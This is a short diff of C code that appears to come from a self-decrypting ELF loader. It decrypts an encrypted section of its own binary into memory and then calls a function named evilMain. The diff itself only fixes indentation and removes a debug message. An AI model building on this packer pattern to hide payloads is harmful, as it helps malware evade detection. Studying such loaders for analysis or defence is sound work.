@@ -80,7 +80,7 @@ bool decryptSections(FILE* target, Elf64_Shdr secretSection) {
         return false;
     }
 
-        // Write the decrypted data to the correct location inside the page.
+    // Write the decrypted data to the correct location inside the page.
     memcpy((void*)&stub, decrypted, secretSection.sh_size);
 
     // Set permissions back.
@@ -123,8 +123,7 @@ bool decryptSection(char* progname) {
 
 int main(int argc, char* argv[]) {
 
-    printf("Decrypting section...\n");
     if (decryptSection(argv[0]))
         return evilMain();
-    return 1;
+    return 1; 
 }
